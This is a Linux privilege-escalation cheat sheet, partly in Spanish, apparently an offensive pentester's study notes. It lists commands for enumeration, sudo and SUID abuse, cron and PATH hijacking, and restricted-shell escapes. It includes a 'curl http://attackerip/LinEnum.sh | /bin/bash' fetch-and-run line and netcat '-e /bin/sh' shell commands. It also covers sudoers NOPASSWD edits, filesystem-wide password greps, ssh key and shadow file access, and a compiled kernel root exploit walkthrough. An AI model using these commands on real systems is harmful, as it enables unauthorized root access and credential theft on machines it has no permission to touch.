---
title: linux privesc
category: linux privesc
order: 1
---
---
based on:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

https://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections?next_slideshow=1


&nbsp;
# **1 AUTOMATIC INFO GATHERING**
---
### linPEAS
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
```
./linpeas.sh
```

### LinEnum
https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

```
curl http://attackerip/LinEnum.sh | /bin/bash
./LinEnum.sh -t
```
### Linuxprivchecker
http://www.securitysift.com/download/linuxprivchecker.py

&nbsp;
# **2 MANUAL INFO GATHERING**
---
### Operating System
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
lsb_release -a
cat /etc/redhat-release   # Redhat based
```
### user info
```
id
whoami
last
```
### kernel

https://github.com/mzet-/linux-exploit-suggester

https://github.com/jondonas/linux-exploit-suggester-2

```
cat /proc/version
uname -a
uname -ar
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```
### environmental variables
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

### history
```
~/.bash_history
~/.nano_history
~/.atftp_history
~/.mysql_history
~/.php_history
~/.viminfo
```



### Application services
```
ps aux
ps -ef
top
cat /etc/services
systemctl status (service)
top
service --status-all
```

### check installed programs, permissions, hidden files  
```
ls -lah
ls -lah /usr/bin
ls -lah /sbin
yum list installed
dpkg-query -l
dpkg -l
rpm -qa
ls -lah /usr/share/applications | awk -F '.desktop' ' { print $1}'
```


### Whats running?
```
ps aux
netstat -antup
```

### whats installed?
```
dpkg -l
rpm -qa (centOS/OpenSUSE)
uname -a
```

### Check any unmounted drives  
```
cat /etc/fstab  
```

### Writable by current user  
```
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/nul  
```

### Any service running by root?  
```
ps aux|grep "root"  
/usr/bin/journalctl (Which is normally not readable by a user) << cron job?  
```

### Find symlinks and what they point to:
```
find / -type l -ls
```

## using pspy to monitor process
```
pspy
```
&nbsp;
&nbsp;
# **3 SUDO, abusing and misconfiguration**
---
```
sudo su
sudo -l ex:  (onuma) (NOPASSWD)/bin/tar  -> sudo -u onuma /bin/tar
sudo -i
sudo /bin/bash
sudo su-
sudo ht
pkexec visudo
```
&nbsp;
&nbsp;
# **4 SUID**
---

- suid:cuando se ejecuta el archivo se ejecuta con el permiso del owner (chmod 4000)
- sgid: corre como el grupo del owner.(chmod 2000)
- sticky bit: solo el owner puede borrar o renombrar adentro de la carpeta.

```
find / -perm -g=s -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null    # SUID

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  
```

### Find SUID root files
```
find / -user root -perm -4000 -print  2>/dev/null
```
### Find SGID root files:
```
find / -group root -perm -2000 -print 2>/dev/null
```
### Find SUID and SGID files owned by anyone:
```
find / -perm -4000 -o -perm -2000 -print  2>/dev/null
```

&nbsp;
&nbsp;
# **5 DOCKER**
---
http://reventlov.com/advisories/using-the-docker-command-to-root-the-host

&nbsp;
&nbsp;
# **6 KERNEL**
---
&nbsp;
&nbsp;
# **7 CRON**
---
### syntax
```
* * * * * <command to be executed>
- - - - -
| | | | |
| | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
| | | ------- Month (1 - 12)
| | --------- Day (1 - 31)
| ----------- Hour (0 - 23)
------------- Minute (0 - 59)
```

###  check
```
cat /etc/cron.d/*
cat /var/spool/cron/*
crontab -l
cat /etc/crontab
cat /etc/cron.(time)
systemctl list-timers
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```
## option 1
editing the scripts run by cron:
### adding user:
```
TODO
```
### reverse shell:
```
```

## option 2
if the files are not misconfigured, we can try to exploit the script if its behavior is insecure.

&nbsp;
&nbsp;
# **8 ABUSING misconfigured Permissions**
---
### private ssh keys
```
~/.ssh/authorized_keys : specifies the SSH keys that can be used for logging into the user account
~/.ssh/identity.pub
~/.ssh/identity
~/.ssh/id_rsa.pub
~/.ssh/id_rsa
~/.ssh/id_dsa.pub
~/.ssh/id_dsa
/etc/ssh/ssh_config  : OpenSSH SSH client configuration files
/etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
```
```
find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
cat /etc/sudoers
cat /etc/passwd
```
### Writable file and nobody files  
```
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files  
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files  
```
### Any script files that we can modify?  
```
find / -writable -type f -name "*.py" 2>/dev/null     #find all python file that can be write by us  
```
### Find password  
```
grep -rnw '/' -ie 'pass' --color=always  
grep -rnw '/' -ie 'DB_PASS' --color=always  
grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
grep -rnw '/' -ie 'DB_USER' --color=always  
```
### Find incorrect file permision
```
Find / -perm -2 ! -type l -ls 2>/dev/null
```

### Find files that are not owned by any user:
```
find / -nouser -print  2>/dev/null
```
### Find files that are not owned by any group:
```
find / -nogroup -print  2>/dev/null
```
&nbsp;
&nbsp;
# **9 GETTING OUT RESTRICTED SHELLS**
---

* fijate que variables de entorno hay  con env
* corre ‘export -p’ para ver que variables son read only  y si hay alguna con permiso de escritura ( $PATH y $SHELL? :D )
* check GTFO bins (https://gtfobins.github.com)
```
compgen -c # check available commands
```
* con ssh podes forzar tty
```
ssh monitor@127.0.0.1 -i ~/.ssh/.monitor -t bash
```

&nbsp;
&nbsp;
# **10 PATH HIJACKING**
---

si un cron corre un binario o script  SIN PATH  ,  ejemplo
```
 cat /home/sarasa
 ```
 dependiendo de los permisos podriamos cambiar el path de quien corre el comando y poner  PRIMERO el
 path a donde metemos nuestro evil cat.

## Common
```
si tenes chsh podes cambiar la shell a  /bin/bash
bin/sh
cp /bin/sh .; sh
ftp -> !/bin/sh
gdb -> !/bin/sh
more/ less/ man -> !/bin/sh
vi -> :!/bin/sh : cuando salis de vi terminas con la shell .
scp -S /tmp/getMeOut.sh x y : Refer Breaking out of rbash using scp
awk ‘BEGIN {system(“/bin/sh”)}’
find / -name someName -exec /bin/sh ;
tee: echo "Your evil code" | tee script.sh
ssh username@IP -t "/bin/sh"
ssh username@IP -t "bash --noprofile"
bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  

vi-->       :!bash
vi-->       :set shell=/bin/bash:shell
awk-->      awk 'BEGIN {system("/bin/bash")}'
find-->     find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
perl-->     perl -e 'exec "/bin/bash";'
Nmap  
    nmap -V     <Nmap version 2.02 - 5.21 had an interactive mode  
    nmap --interactive  
    nmap> !sh  

Vim  
    Modify system file, e.g. passwd?  
    vim.tiny  
    - Press ESC key  
    :set shell=/bin/sh  
    :shell  

find  
    touch pentestlab  
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;  

Bash  
    bash -p      

More  

Less  
    less /etc/passwd  
    !/bin/sh  

Nano  
    Can you modify system file?  
    Modify /etc/suoders  
    \<user> ALL=(ALL) NOPASSWD:ALL  

cp  
    Use cp to overwrite passwd with a new password  

```
### vim
```
:version
:python3 import pty;pty.spawn("/bin/bash")
```
## Usando scripting laguages.

```
python -c 'import os; os.system("/bin/bash")
perl -e 'exec "/bin/sh";'
etc...
```

&nbsp;
&nbsp;
# **10 EXAMPLES**
---
## Mysql run by root
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
https://www.exploit-db.com/exploits/1518/

You can also try:
```
select sys_exec('echo test>/tmp/test.txt');
select sys_eval('echo test>/tmp/test.txt');
```

## Mempodipper
steve dosent have privilage

```
steve@ubuntu:   cat /etc/shadow
permission denied
steve@ubuntu: cat /etc/issue
ubuntu 11.10
steve@ubuntu: uname -a
linux ubu 3.0.0-12-generic < por ahi es vulnerable el kernel
```

podemos buscar en exploit database a ver que onda

encontramos Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64

```
steve@ubuntu: wget -O exploit.c http://www.exploit-db.com/download/18411
steve@ubuntu: gcc exploit.c -o exploit
steve@ubuntu: file exploit
exploit: ELF etc......
ste@ubuntu: id
uid=10000 gid=10000 groups, etc
steve@ubuntu: ./exploit
#id
uid=0(root)
```
## wget without wget
nformation about Bash Built-in /dev/tcp File (TCP/IP)

The following script fetches the front page from Google:
```
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```

The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:


Second line: After the socket is open we send our HTTP request out the socket with the echo … >&3 command. The request consists of:

```
GET / HTTP/1.1
host: http://www.google.com
Connection: close
```

Each line is followed by a carriage-return and newline, and all the headers 2are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).

Third line: Next we read the response out of the socket using cat <&3, which reads the response and prints it out.


&nbsp;
&nbsp;
## **11 wildcards ?**
---
hay algun cron corriendo con wildcards?
&nbsp;
&nbsp;
## **12 linux capabilities**
---
* find cap  files
```
getcat -r * 2>/dev/null
```
* creating an evil cap
```
[root@centos7-1 mnt]# cp -p /bin/bash /mnt/myBash
[root@centos7-1 mnt]# setcap all+epi /mnt/myBash
[root@centos7-1 mnt]# getcap /mnt/myBash
/mnt/myBash =eip
```
then
```
/mnt/myBash --inh-caps +all --reuid 0 /bin/bash
# root
```
(no mne funco en debian)
